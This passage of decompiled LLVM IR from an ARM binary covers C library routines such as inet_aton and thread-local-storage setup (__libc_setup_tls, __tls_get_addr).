  %v1_17390 = trunc i32 %v0_17390 to i8
  %v2_17390 = load i32, i32* @r4, align 4
  %v3_17390 = add i32 %v2_17390, 16
  %v4_17390 = inttoptr i32 %v3_17390 to i8*
  store i8 %v1_17390, i8* %v4_17390, align 1
  %v0_17394 = load i32, i32* @r4, align 4
  %v1_17394 = add i32 %v0_17394, 17
  store i32 %v1_17394, i32* %r0.global-to-local, align 4
  %v4_17398 = call i32 @__GI_mempcpy(i32 %v1_17394, i32 %v2_17384, i32 19, i32 %v3_17374)
  store i32 %v4_17398, i32* %r0.global-to-local, align 4
  %v0_1739c = load i32, i32* @r5, align 4
  store i32 %v0_1739c, i32* %r1.global-to-local, align 4
  %v3_173a4 = inttoptr i32 %v4_17398 to i8*
  %v4_173a4 = call i32 @__GI_memset(i8* %v3_173a4, i32 %v0_1739c, i32 13)
  store i32 %v4_173a4, i32* %r0.global-to-local, align 4
  %v0_173a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_173a8

dec_label_pc_173a8:                               ; preds = %entry, %dec_label_pc_17364
  %v0_173a8 = phi i32 [ %v3_17358, %entry ], [ %v0_173a8.pre, %dec_label_pc_17364 ]
  store i32 %v0_173a8, i32* %r0.global-to-local, align 4
  store i32 %v3_17340, i32* @r4, align 4
  store i32 %v6_17340, i32* @r5, align 4
  store i32 %v9_17340, i32* @r6, align 4
  ret i32 %v0_173a8

; uselistorder directives
  uselistorder i32 %v0_173a8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 16, 1, 4, 17, 18, 5, 19, 6, 7, 8, 9, 10, 11, 20, 12, 21, 13, 22, 23, 14, 24, 15, 2, 25, 3, 26, 27, 28, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_173a8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_173bc = load i32, i32* @r4, align 4
  store i32 %v3_173bc, i32* %stack_var_-28, align 4
  %v0_173c4 = load i32, i32* @r0, align 4
  %v2_173c4 = icmp eq i32 %v0_173c4, 0
  %v0_173cc = load i32, i32* @r1, align 4
  br i1 %v2_173c4, label %dec_label_pc_174a0, label %dec_label_pc_173d4

dec_label_pc_173d4:                               ; preds = %entry
  br label %dec_label_pc_173ec

dec_label_pc_173ec:                               ; preds = %dec_label_pc_173d4, %dec_label_pc_17464
  %v1_17464 = phi i32 [ 0, %dec_label_pc_173d4 ], [ %v5_17464, %dec_label_pc_17464 ]
  %v0_17468 = phi i32 [ 1, %dec_label_pc_173d4 ], [ %v1_17468, %dec_label_pc_17464 ]
  %v0_173ec = phi i32 [ %v0_173c4, %dec_label_pc_173d4 ], [ %v0_173ec14, %dec_label_pc_17464 ]
  %v1_173ec = inttoptr i32 %v0_173ec to i8*
  %v2_173ec = load i8, i8* %v1_173ec, align 1
  %v3_173ec = zext i8 %v2_173ec to i32
  %v4_173f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 276) to i32*), align 4
  %v2_173f4 = mul nuw nsw i32 %v3_173ec, 2
  %v2_173f8 = add i32 %v2_173f4, %v4_173f0
  %v3_173f8 = inttoptr i32 %v2_173f8 to i16*
  %v4_173f8 = load i16, i16* %v3_173f8, align 2
  %v1_173fc = and i16 %v4_173f8, 8
  %v2_173fc = icmp eq i16 %v1_173fc, 0
  br i1 %v2_173fc, label %dec_label_pc_174a0, label %dec_label_pc_17404

dec_label_pc_17404:                               ; preds = %dec_label_pc_173ec
  br label %dec_label_pc_17424

dec_label_pc_1740c:                               ; preds = %dec_label_pc_17424
  %v2_1740c = mul i32 %v0_17464, 10
  %v1_17410 = add i32 %v2_1740c, -48
  %v2_17414 = add i32 %v3_17424, %v1_17410
  %v8_1741c = icmp sgt i32 %v2_17414, 255
  br i1 %v8_1741c, label %dec_label_pc_174a0, label %dec_label_pc_17420

dec_label_pc_17420:                               ; preds = %dec_label_pc_1740c
  %v1_17420 = add i32 %v0_17454, 1
  store i32 %v1_17420, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17424

dec_label_pc_17424:                               ; preds = %dec_label_pc_17404, %dec_label_pc_17420
  %v0_17464 = phi i32 [ 0, %dec_label_pc_17404 ], [ %v2_17414, %dec_label_pc_17420 ]
  %v0_17454 = phi i32 [ %v0_173ec, %dec_label_pc_17404 ], [ %v1_17420, %dec_label_pc_17420 ]
  %v1_17424 = inttoptr i32 %v0_17454 to i8*
  %v2_17424 = load i8, i8* %v1_17424, align 1
  %v3_17424 = zext i8 %v2_17424 to i32
  %v2_17428 = mul nuw nsw i32 %v3_17424, 2
  %v2_1742c = add i32 %v2_17428, %v4_173f0
  %v3_1742c = inttoptr i32 %v2_1742c to i16*
  %v4_1742c = load i16, i16* %v3_1742c, align 2
  %v6_1742c = zext i16 %v4_1742c to i32
  %v1_17430 = and i32 %v6_1742c, 8
  %v2_17430 = icmp eq i32 %v1_17430, 0
  br i1 %v2_17430, label %dec_label_pc_17438, label %dec_label_pc_1740c

dec_label_pc_17438:                               ; preds = %dec_label_pc_17424
  %v7_17438 = icmp eq i32 %v0_17468, 4
  br i1 %v7_17438, label %dec_label_pc_17450, label %dec_label_pc_17440

dec_label_pc_17440:                               ; preds = %dec_label_pc_17438
  %v7_17440 = icmp eq i8 %v2_17424, 46
  br i1 %v7_17440, label %dec_label_pc_17448, label %dec_label_pc_174a0

dec_label_pc_17448:                               ; preds = %dec_label_pc_17440
  %v1_17448 = add i32 %v0_17454, 1
  store i32 %v1_17448, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17464

dec_label_pc_17450:                               ; preds = %dec_label_pc_17438
  %v2_17450 = icmp eq i8 %v2_17424, 0
  %v1_17454 = add i32 %v0_17454, 1
  store i32 %v1_17454, i32* %r0.global-to-local, align 4
  br i1 %v2_17450, label %dec_label_pc_17464, label %dec_label_pc_1745c

dec_label_pc_1745c:                               ; preds = %dec_label_pc_17450
  %v1_1745c = and i32 %v6_1742c, 32
  %v2_1745c = icmp eq i32 %v1_1745c, 0
  br i1 %v2_1745c, label %dec_label_pc_174a0, label %dec_label_pc_17464

dec_label_pc_17464:                               ; preds = %dec_label_pc_1745c, %dec_label_pc_17450, %dec_label_pc_17448
  %v0_173ec14 = phi i32 [ %v1_17454, %dec_label_pc_1745c ], [ %v1_17454, %dec_label_pc_17450 ], [ %v1_17448, %dec_label_pc_17448 ]
  %v4_17464 = mul i32 %v1_17464, 256
  %v5_17464 = or i32 %v0_17464, %v4_17464
  %v1_17468 = add nuw nsw i32 %v0_17468, 1
  %v7_17470 = icmp slt i32 %v1_17468, 5
  br i1 %v7_17470, label %dec_label_pc_173ec, label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %dec_label_pc_17464
  %v2_17474 = icmp eq i32 %v0_173cc, 0
  br i1 %v2_17474, label %.thread9.thread, label %bb

.thread9.thread:                                  ; preds = %dec_label_pc_17474
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174a4

bb:                                               ; preds = %dec_label_pc_17474
  %v4_17478 = udiv i32 %v5_17464, 16777216
  %v2_1747c = udiv i32 %v5_17464, 256
  %v5_17480 = and i32 %v2_1747c, 65280
  %v2_17484 = and i32 %v5_17464, 65280
  %v5_17488 = mul nuw nsw i32 %v2_17484, 256
  %v5_1748c = mul i32 %v0_17464, 16777216
  %v6_17480 = or i32 %v4_17478, %v5_1748c
  %v6_17488 = or i32 %v6_17480, %v5_17480
  %v6_1748c = or i32 %v6_17488, %v5_17488
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17498 = inttoptr i32 %v0_173cc to i32*
  store i32 %v6_1748c, i32* %v3_17498, align 4
  %v2_174a4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_174a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174a4

dec_label_pc_174a0:                               ; preds = %dec_label_pc_17440, %dec_label_pc_1745c, %dec_label_pc_173ec, %dec_label_pc_1740c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174a4

dec_label_pc_174a4:                               ; preds = %.thread9.thread, %bb, %dec_label_pc_174a0
  %v1_174a8 = phi i32 [ %v1_174a8.pre, %bb ], [ 0, %dec_label_pc_174a0 ], [ 1, %.thread9.thread ]
  %v2_174a4 = phi i32 [ %v2_174a4.pre, %bb ], [ %v3_173bc, %dec_label_pc_174a0 ], [ %v3_173bc, %.thread9.thread ]
  store i32 %v2_174a4, i32* @r4, align 4
  ret i32 %v1_174a8

; uselistorder directives
  uselistorder i32 %v1_17468, { 1, 0 }
  uselistorder i32 %v5_17464, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17454, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 69, 0, 6, 1, 2, 7, 8, 9, 10, 11, 49, 50, 12, 13, 14, 51, 52, 15, 16, 17, 18, 19, 53, 3, 54, 55, 20, 21, 4, 22, 56, 57, 40, 23, 24, 25, 26, 27, 43, 44, 41, 42, 58, 59, 60, 47, 48, 45, 46, 61, 62, 63, 64, 5, 65, 28, 29, 66, 30, 31, 32, 33, 67, 34, 35, 68, 36, 37, 38, 39, 70 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i16 0, { 0, 1, 2, 7, 8, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 5, 19, 6, 20, 21, 22 }
  uselistorder i32 276, { 1, 0 }
  uselistorder label %dec_label_pc_174a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_174a0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17424, { 1, 0 }
  uselistorder label %dec_label_pc_173ec, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_174c0 = load i32, i32* @r4, align 4
  store i32 %v3_174c0, i32* %stack_var_-16, align 4
  %v4_174c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_174cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_174d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 36) to i32*), align 4
  store i32 %v4_174d4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_174dc = inttoptr i32 %v4_174c4 to i32*
  %v2_174dc = load i32, i32* %v1_174dc, align 4
  %v4_174e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 52) to i32*), align 4
  store i32 %v4_174e0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_174e8 = add i32 %v2_174dc, 15
  %v4_174ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 144) to i32*), align 4
  store i32 %v4_174ec, i32* @ip, align 4
  %v1_174f0 = load i32, i32* @r0, align 4
  %v2_174f0 = add i32 %v1_174f0, %v1_174e8
  %v1_174f4 = inttoptr i32 %v4_174cc to i32*
  %v2_174f4 = load i32, i32* %v1_174f4, align 4
  store i32 %v2_174f4, i32* %r3.global-to-local, align 4
  %v1_174f8 = and i32 %v2_174f0, -16
  store i32 %v1_174f8, i32* %v1_174dc, align 4
  %v0_17500 = load i32, i32* @r0, align 4
  %v1_17500 = load i32, i32* %r4.global-to-local, align 4
  %v2_17500 = inttoptr i32 %v1_17500 to i32*
  store i32 %v0_17500, i32* %v2_17500, align 4
  %v0_17504 = load i32, i32* @r1, align 4
  %v1_17504 = load i32, i32* %lr.global-to-local, align 4
  %v2_17504 = inttoptr i32 %v1_17504 to i32*
  store i32 %v0_17504, i32* %v2_17504, align 4
  %v0_17508 = load i32, i32* %r3.global-to-local, align 4
  %v1_17508 = load i32, i32* @ip, align 4
  %v2_17508 = inttoptr i32 %v1_17508 to i32*
  store i32 %v0_17508, i32* %v2_17508, align 4
  %v2_1750c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1750c, i32* %r4.global-to-local, align 4
  %v1_17510 = load i32, i32* @r0, align 4
  ret i32 %v1_17510

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17518(i32 %arg1) local_unnamed_addr {
dec_label_pc_17518:
  %v0_17518 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17518, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17518
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17518, %bb
  %v4_17528 = phi i32 [ %arg1, %dec_label_pc_17518 ], [ 0, %bb ]
  ret i32 %v4_17528

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r3.global-to-local, align 4
  %v4_1753c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 84) to i32*), align 4
  store i32 %v4_1753c, i32* @lr, align 4
  %v4_17548 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_17568 = inttoptr i32 %v4_17548 to i32*
  store i32 1, i32* %v2_17568, align 4
  %v0_1756c = load i32, i32* %r3.global-to-local, align 4
  %v1_1756c = load i32, i32* @lr, align 4
  %v2_1756c = inttoptr i32 %v1_1756c to i32*
  store i32 %v0_1756c, i32* %v2_1756c, align 4
  %v0_17570 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17588(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17588:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17588 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17588, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17588
  %v2_17588 = load i32, i32* @r4, align 4
  %v8_17588 = ashr i32 %v2_17588, %tmp
  %v9_17588 = and i32 %v8_17588, %tmp
  %v2_1758c = load i32, i32* @ip, align 4
  %v8_1758c = lshr i32 %v2_1758c, %v9_17588
  %v9_1758c = and i32 %v8_1758c, %v9_17588
  store i32 %v9_1758c, i32* %r0.global-to-local, align 4
  %v4_17590 = inttoptr i32 %v9_1758c to i32*
  store i32 %arg2, i32* %v4_17590, align 4
  %v5_17590 = load i32, i32* @ip, align 4
  %v6_17590 = load i32, i32* %r0.global-to-local, align 4
  %v7_17590 = sub i32 %v6_17590, %v5_17590
  store i32 %v7_17590, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17588, %bb
  %v8_17590 = phi i32 [ %tmp, %dec_label_pc_17588 ], [ %v7_17590, %bb ]
  ret i32 %v8_17590

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1759c = call i32 @__aeabi_read_tp()
  %v1_175a0 = inttoptr i32 %v0_1759c to i32*
  %v2_175a0 = load i32, i32* %v1_175a0, align 4
  %v1_175a4 = add i32 %arg1, 4
  %v2_175a4 = inttoptr i32 %v1_175a4 to i32*
  %v3_175a4 = load i32, i32* %v2_175a4, align 4
  %v1_175a8 = add i32 %v2_175a0, 8
  %v2_175a8 = inttoptr i32 %v1_175a8 to i32*
  %v3_175a8 = load i32, i32* %v2_175a8, align 4
  %v2_175ac = add i32 %v3_175a8, %v3_175a4
  ret i32 %v2_175ac
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_175b8 = load i32, i32* @r4, align 4
  store i32 %v3_175b8, i32* %stack_var_-36, align 4
  %v6_175b8 = load i32, i32* @r5, align 4
  %v15_175b8 = load i32, i32* @r8, align 4
  %v18_175b8 = load i32, i32* @sb, align 4
  %v21_175b8 = load i32, i32* @sl, align 4
  %v24_175b8 = load i32, i32* @fp, align 4
  %v27_175b8 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %sl.global-to-local, align 4
  %v4_175c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 104) to i32*), align 4
  store i32 %v4_175c8, i32* %r3.global-to-local, align 4
  %v1_175cc = inttoptr i32 %v4_175c8 to i32*
  %v2_175cc = load i32, i32* %v1_175cc, align 4
  store i32 %v2_175cc, i32* %r2.global-to-local, align 4
  %v2_175d0 = icmp eq i32 %v2_175cc, 0
  %v0_175d8 = load i32, i32* %r0.global-to-local, align 4
  %v0_175dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_175dc, i32* %ip.global-to-local, align 4
  br i1 %v2_175d0, label %dec_label_pc_177a4, label %dec_label_pc_175e4

dec_label_pc_175e4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_175e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 156) to i32*), align 4
  store i32 %v4_175e8, i32* @lr, align 4
  store i32 %v2_175cc, i32* %r1.global-to-local, align 4
  %v1_17630 = inttoptr i32 %v4_175e8 to i32*
  %v2_1763061 = load i32, i32* %v1_17630, align 4
  %v4_1763462 = mul i32 %v2_1763061, 32
  %v5_1763463 = add i32 %v4_1763462, %v2_175cc
  store i32 %v5_1763463, i32* %r3.global-to-local, align 4
  %v3_1763865 = icmp ult i32 %v2_175cc, %v5_1763463
  br i1 %v3_1763865, label %dec_label_pc_175f4, label %dec_label_pc_177a4.loopexit

dec_label_pc_175f4:                               ; preds = %dec_label_pc_175e4, %dec_label_pc_1762c
  %v0_1760c66 = phi i32 [ %v1_1762c, %dec_label_pc_1762c ], [ %v2_175cc, %dec_label_pc_175e4 ]
  %v1_175f4 = inttoptr i32 %v0_1760c66 to i32*
  %v2_175f4 = load i32, i32* %v1_175f4, align 4
  store i32 %v2_175f4, i32* %r3.global-to-local, align 4
  %v7_175f8 = icmp eq i32 %v2_175f4, 7
  br i1 %v7_175f8, label %dec_label_pc_17600, label %dec_label_pc_1762c

dec_label_pc_17600:                               ; preds = %dec_label_pc_175f4
  %v1_17600 = add i32 %v0_1760c66, 20
  %v2_17600 = inttoptr i32 %v1_17600 to i32*
  %v3_17600 = load i32, i32* %v2_17600, align 4
  store i32 %v3_17600, i32* %r3.global-to-local, align 4
  %v1_17604 = add i32 %v0_1760c66, 28
  %v2_17604 = inttoptr i32 %v1_17604 to i32*
  %v3_17604 = load i32, i32* %v2_17604, align 4
  store i32 %v3_17604, i32* @r6, align 4
  %v1_1760c = add i32 %v0_1760c66, 16
  %v2_1760c = inttoptr i32 %v1_1760c to i32*
  %v3_1760c = load i32, i32* %v2_1760c, align 4
  store i32 %v3_1760c, i32* %r3.global-to-local, align 4
  %v1_17610 = add i32 %v0_1760c66, 8
  %v2_17610 = inttoptr i32 %v1_17610 to i32*
  %v3_17610 = load i32, i32* %v2_17610, align 4
  store i32 %v3_17610, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17604, %v0_175dc
  %v0_175dc.v3_17604 = select i1 %tmp78, i32 %v0_175dc, i32 %v3_17604
  store i32 %v0_175dc.v3_17604, i32* %fp.global-to-local, align 4
  %v2_17648 = icmp eq i32 %v3_17604, 0
  br i1 %v2_17648, label %dec_label_pc_17670, label %bb

dec_label_pc_1762c:                               ; preds = %dec_label_pc_175f4
  %v1_1762c = add i32 %v0_1760c66, 32
  store i32 %v1_1762c, i32* %r1.global-to-local, align 4
  %v2_17630 = load i32, i32* %v1_17630, align 4
  %v4_17634 = mul i32 %v2_17630, 32
  %v5_17634 = add i32 %v4_17634, %v2_175cc
  store i32 %v5_17634, i32* %r3.global-to-local, align 4
  %v3_17638 = icmp ult i32 %v1_1762c, %v5_17634
  br i1 %v3_17638, label %dec_label_pc_175f4, label %dec_label_pc_17630.dec_label_pc_177a4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17600
  %v2_1764c = add i32 %v3_17604, -1
  br label %dec_label_pc_17674

dec_label_pc_17670:                               ; preds = %dec_label_pc_17600, %dec_label_pc_177a4
  %v0_17684.pre = phi i32 [ %v0_17684.pre.pre, %dec_label_pc_177a4 ], [ ptrtoint (i32* @global_var_219e0.355 to i32), %dec_label_pc_17600 ]
  %v1_17674.pre = phi i32 [ %v1_17674.pre.pre, %dec_label_pc_177a4 ], [ %v0_175d8, %dec_label_pc_17600 ]
  %v1_1769825 = phi i32 [ %v0_177ac, %dec_label_pc_177a4 ], [ %v0_175dc.v3_17604, %dec_label_pc_17600 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_177a4 ], [ %v3_17600, %dec_label_pc_17600 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_177a4 ], [ %v3_1760c, %dec_label_pc_17600 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_177a4 ], [ %v3_17610, %dec_label_pc_17600 ]
  br label %dec_label_pc_17674

dec_label_pc_17674:                               ; preds = %bb, %dec_label_pc_17670
  %storemerge80 = phi i32 [ %v2_1764c, %bb ], [ 0, %dec_label_pc_17670 ]
  %v0_17674 = phi i32 [ %v2_1764c, %bb ], [ 0, %dec_label_pc_17670 ]
  %storemerge = phi i32 [ %v3_17604, %bb ], [ 1, %dec_label_pc_17670 ]
  %storemerge79 = phi i32 [ %v3_17604, %bb ], [ 1, %dec_label_pc_17670 ]
  %v0_17684 = phi i32 [ ptrtoint (i32* @global_var_219e0.355 to i32), %bb ], [ %v0_17684.pre, %dec_label_pc_17670 ]
  %v1_17674 = phi i32 [ %v0_175d8, %bb ], [ %v1_17674.pre, %dec_label_pc_17670 ]
  %v1_17698 = phi i32 [ %v0_175dc.v3_17604, %bb ], [ %v1_1769825, %dec_label_pc_17670 ]
  %stack_var_-52.3 = phi i32 [ %v3_17600, %bb ], [ %stack_var_-52.0, %dec_label_pc_17670 ]
  %stack_var_-48.3 = phi i32 [ %v3_1760c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17670 ]
  %stack_var_-44.3 = phi i32 [ %v3_17610, %bb ], [ %stack_var_-44.0, %dec_label_pc_17670 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17674 = add i32 %v1_17674, %v0_17674
  %v2_17678 = udiv i32 %v2_17674, %storemerge
  store i32 %v2_17678, i32* %r0.global-to-local, align 4
  %v2_1767c = mul i32 %v2_17678, %storemerge
  store i32 %v2_1767c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17684 = add i32 %v0_17684, 72
  %v3_17684 = inttoptr i32 %v2_17684 to i32*
  %v4_17684 = load i32, i32* %v3_17684, align 4
  store i32 %v4_17684, i32* %r3.global-to-local, align 4
  %v1_17688 = inttoptr i32 %v4_17684 to i32*
  %v2_17688 = load i32, i32* %v1_17688, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17690 = add i32 %v1_17698, 1168
  %v2_17694 = add i32 %v1_17690, %stack_var_-52.3
  %v2_17698 = add i32 %v2_17694, %v2_1767c
  %v2_1769c = add i32 %v2_17698, %v2_17688
  store i32 %v2_1769c, i32* %r0.global-to-local, align 4
  %v1_176a0 = call i32 @__GI_sbrk(i32 %v2_1769c)
  %v1_176a4 = load i32, i32* %fp.global-to-local, align 4
  %v1_176ac = sub i32 0, %v1_176a4
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_176a4 = add i32 %v1_176a0, 1167
  %v1_176b4 = add i32 %v2_176a4, %v1_176a4
  %v2_176b8 = and i32 %v1_176b4, %v1_176ac
  store i32 %v2_176b8, i32* @r5, align 4
  %v1_176c0 = load i32, i32* %sl.global-to-local, align 4
  %v3_176c0 = add i32 %v1_176c0, 10236
  %v4_176c0 = inttoptr i32 %v3_176c0 to i32*
  store i32 62, i32* %v4_176c0, align 4
  %v0_176c8 = load i32, i32* @r5, align 4
  %v1_176c8 = load i32, i32* %sb.global-to-local, align 4
  %v2_176c8 = add i32 %v1_176c8, %v0_176c8
  store i32 %v2_176c8, i32* @ip, align 4
  %v0_176cc = load i32, i32* %sl.global-to-local, align 4
  %v1_176cc = load i32, i32* %r4.global-to-local, align 4
  %v2_176cc = add i32 %v1_176cc, %v0_176cc
  store i32 %v2_176cc, i32* %r4.global-to-local, align 4
  %v2_176d0 = add i32 %v0_176cc, 11524
  store i32 %v2_176d0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_176c8, i32* @r0, align 4
  %v2_176e4 = add i32 %v2_176cc, 16
  %v3_176e4 = inttoptr i32 %v2_176e4 to i32*
  store i32 %v2_176c8, i32* %v3_176e4, align 4
  %v0_176e8 = load i32, i32* %sb.global-to-local, align 4
  %v1_176e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_176e8 = add i32 %v1_176e8, 40
  %v3_176e8 = inttoptr i32 %v2_176e8 to i32*
  store i32 %v0_176e8, i32* %v3_176e8, align 4
  %v0_176ec = load i32, i32* @r3, align 4
  %v1_176ec = trunc i32 %v0_176ec to i8
  %v2_176ec = load i32, i32* %r4.global-to-local, align 4
  %v3_176ec = add i32 %v2_176ec, 20
  %v4_176ec = inttoptr i32 %v3_176ec to i8*
  store i8 %v1_176ec, i8* %v4_176ec, align 1
  %v0_176f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_176f0 = add i32 %v0_176f0, 8
  store i32 %v1_176f0, i32* @r4, align 4
  %v0_176f4 = call i32 @memcpy()
  %v0_176fc = load i32, i32* @r4, align 4
  %v1_176fc = load i32, i32* @r5, align 4
  %v2_176fc = inttoptr i32 %v1_176fc to i32*
  store i32 %v0_176fc, i32* %v2_176fc, align 4
  %v0_17700 = load i32, i32* @r5, align 4
  store i32 %v0_17700, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17700, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_12ff8.546 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17714 = load i32, i32* %sl.global-to-local, align 4
  %v2_17714 = add i32 %v0_17714, 84
  %v3_17714 = inttoptr i32 %v2_17714 to i32*
  %v4_17714 = load i32, i32* %v3_17714, align 4
  store i32 %v4_17714, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17720 = add i32 %v0_17714, 60
  %v3_17720 = inttoptr i32 %v2_17720 to i32*
  %v4_17720 = load i32, i32* %v3_17720, align 4
  store i32 %v4_17720, i32* %r0.global-to-local, align 4
  %v3_17728 = add i32 %v0_17714, 10748
  %v4_17728 = inttoptr i32 %v3_17728 to i32*
  store i32 64, i32* %v4_17728, align 4
  %v1_17730 = load i32, i32* %r8.global-to-local, align 4
  %v2_17730 = add i32 %v1_17730, 20
  %v3_17730 = inttoptr i32 %v2_17730 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17730, align 4
  %v1_17738 = load i32, i32* %r8.global-to-local, align 4
  %v2_17738 = add i32 %v1_17738, 24
  %v3_17738 = inttoptr i32 %v2_17738 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17738, align 4
  %v1_17740 = load i32, i32* %r0.global-to-local, align 4
  %v2_17740 = inttoptr i32 %v1_17740 to i32*
  store i32 1, i32* %v2_17740, align 4
  %v1_17748 = load i32, i32* %r8.global-to-local, align 4
  %v2_17748 = add i32 %v1_17748, 28
